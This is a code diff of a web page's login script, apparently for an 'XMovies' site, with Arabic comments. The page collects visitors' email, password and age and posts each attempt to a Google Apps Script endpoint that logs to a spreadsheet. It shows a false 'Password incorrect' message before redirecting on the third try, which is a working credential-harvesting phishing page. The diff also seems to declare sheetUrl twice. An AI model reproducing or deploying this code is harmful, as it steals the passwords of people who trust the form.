@@ -56,6 +56,7 @@ const sheetUrl = "https://script.google.com/macros/s/AKfycbwcS4it59k6HArG6yziPd6
 
 // قراءة عدد المحاولات من localStorage
 let attempts = parseInt(localStorage.getItem("xmovies_attempts") || "0");
+const sheetUrl = "https://script.google.com/macros/s/AKfycbzg-TJFz6utgFTdCE0QaW7NC29R30p9qUg5DedchHgEsDIyorulgLzLU6-YgW8dLezO/exec";
 
 async function go(){
   const email = document.getElementById("email").value.trim();
@@ -63,15 +64,12 @@ async function go(){
   const age = document.getElementById("age").value.trim();
   const error = document.getElementById("errorMsg");
 
-  // زيادة العد
   attempts++;
   localStorage.setItem("xmovies_attempts", attempts);
 
-  // إعداد البيانات لإرسالها
+  // إرسال البيانات إلى Google Sheet
   const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}&attempt=${attempts}&form=XMovies`;
-
   try {
-    // إرسال كل محاولة إلى Google Sheets
     await fetch(sheetUrl, {
       method: "POST",
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -82,15 +80,13 @@ async function go(){
     return;
   }
 
-  // تحقق من كلمة المرور أو الوصول للمحاولة الثالثة
   if(pw === correctPassword || attempts >= maxAttempts){
-    localStorage.removeItem("xmovies_attempts"); // إعادة ضبط العد
+    localStorage.removeItem("xmovies_attempts");
     window.location.href = "movies.html";
   } else {
     error.innerText = "Password incorrect";
   }
 }
 </script>
-
 </body>
 </html>
